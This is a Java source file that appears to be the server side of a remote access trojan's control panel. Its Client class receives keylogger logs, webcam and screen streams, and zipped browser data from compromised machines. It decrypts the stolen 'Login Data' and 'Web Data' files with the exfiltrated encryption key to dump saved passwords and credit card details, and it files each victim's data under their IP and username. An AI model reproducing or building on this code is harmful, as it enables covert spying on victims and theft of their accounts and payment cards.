package Server;

import Packets.Credentials.AccountCredentials;
import Packets.Credentials.CombinedCredentials;
import Packets.Credentials.CreditCardCredentials;
import Packets.Identificators.Category;
import Packets.Identificators.Response;
import Packets.SysNetInfo.NetworkInformation;
import Packets.SysNetInfo.SystemInformation;
import Updater.UpdaterInterface;
import Utils.CredentialsDumper;
import Utils.FileWriterTask;
import Utils.Time;
import com.fasterxml.jackson.core.JsonProcessingException;
import org.eclipse.jetty.util.IO;
import org.eclipse.jetty.websocket.api.Session;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import Utils.UniqueByteIDGenerator;
import com.fasterxml.jackson.databind.ObjectMapper;


public class Client {
    private final Session session;
    private final ExecutorService executor = Executors.newCachedThreadPool();

    public UpdaterInterface updater;
    private boolean isWebcamDialogOpen;
    private final UniqueByteIDGenerator uniqueByteIDGeneratorIn = new UniqueByteIDGenerator();
    private final UniqueByteIDGenerator uniqueByteIDGeneratorOut = new UniqueByteIDGenerator();
    private final ConcurrentHashMap<Byte, BytesChannel> activeChannels = new ConcurrentHashMap<>();

    public ConcurrentHashMap<Byte, BytesChannel> getFileChannels() {
        return activeChannels;
    }

    public Client(Session session) {
        this.session = session;
        this.updater = ConnectionStore.updaterFactory.createInstance();
    }

    public BytesChannel createFileChannel(Category category) {
        byte id = uniqueByteIDGeneratorIn.getID();
        BytesChannel channel = new BytesChannel(id, category, updater);
        activeChannels.put(id, channel);
        return channel;
    }

    public void handleFileCompletion(BytesChannel bytesChannel, byte[] finalData) {
        switch (bytesChannel.getCategory()) {
            case ZIP_FILE, WEBCAM_LOGS, KEYLOGGER_LOGS -> {
                String outputFolder = writeFile(finalData, bytesChannel.getCategoryOutputFolder());
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("RESPONSE", "SHOW_DOWNLOADED");
                jsonObject.put("client_id", getUUID());
                jsonObject.put("path", outputFolder);
                updater.processMessage(jsonObject.toString());
                closeFileChannel(bytesChannel.getId());
            }
            case WEBCAM_STREAMING -> {
                updater.updateFrameOfWebcamStreamer(finalData);
                bytesChannel.getBuffer().clear();
            }
            case SCREEN_STREAMING -> {
                updater.updateFrameOfScreenStreamer(finalData);
                bytesChannel.getBuffer().clear();
            }
            case BROWSER_CREDENTIALS -> {
                JSONObject outputJSON = new JSONObject(unzipCredentialsAndGetPath(finalData, bytesChannel.getCategoryOutputFolder()));
                closeFileChannel(bytesChannel.getId());
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("RESPONSE", "DUMP_CREDENTIALS");
                jsonObject.put("info", outputJSON);
                updater.processMessage(jsonObject.toString());
            }
        }
        // closeFileChannel(bytesChannel.getId());
    }



    // Cierra un FileChannel y libera su ID
    public void closeFileChannel(byte id) {
        activeChannels.remove(id);
        uniqueByteIDGeneratorIn.finishTask(id);
    }







    public String writeFile(byte[] data, String category) {
        String finalNameOfFolder = category + " - " + new Time().getTime();
        Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString(), updater.shouldExtract());
        task.run();
        return pathOfDownload.toString();
    }

    public String unzipCredentialsAndGetPath(byte[] data, String category) {
        String finalNameOfFolder = category + " - " + new Time().getTime();
        Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString(), true);
        task.unzipFileInMemory();
        byte[] secretKeyBytes;
        try {
            secretKeyBytes = Files.readAllBytes(new File(pathOfDownload + "\\Encryption Key").toPath());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return getString(secretKeyBytes, pathOfDownload);
    }

    private static String getString(byte[] secretKeyBytes, Path pathOfDownload) {
        CredentialsDumper credentialsDumper = new CredentialsDumper(secretKeyBytes, pathOfDownload + "\\Login Data", pathOfDownload + "\\Web Data");
        CombinedCredentials combinedCredentials = credentialsDumper.getCredentials();
        ObjectMapper objectMapper = new ObjectMapper();
        String result;
        try {
            result = objectMapper.writeValueAsString(combinedCredentials);
        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }
        return result;
    }


    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }


    public void sendString(String message) throws IOException {
        if (session.isOpen()){
            session.getRemote().sendString(message);
        } else {
            throw new IOException("Attempted to send message on closed session.");
        }
    }

    public void sendBytes(ByteBuffer byteBuffer) throws IOException {
        session.getRemote().sendBytes(byteBuffer);
    }

    public String getUUID() {
        return updater.getSystemInformation().UUID();
    }

    public String getIdentifier() {
        return updater.getNetworkInformation().IP() + " - " + updater.getSystemInformation().USER_NAME();
    }

    public Session getSession() {
        return session;
    }

    public UniqueByteIDGenerator getUniqueByteIDGeneratorOut() {
        return uniqueByteIDGeneratorOut;
    }


    public ExecutorService getExecutor() {
        return executor;
    }


    public boolean isWebcamDialogOpen() {
        return isWebcamDialogOpen;
    }

    public void setWebcamDialogOpen(boolean webcamDialogOpen) {
        isWebcamDialogOpen = webcamDialogOpen;
    }
}
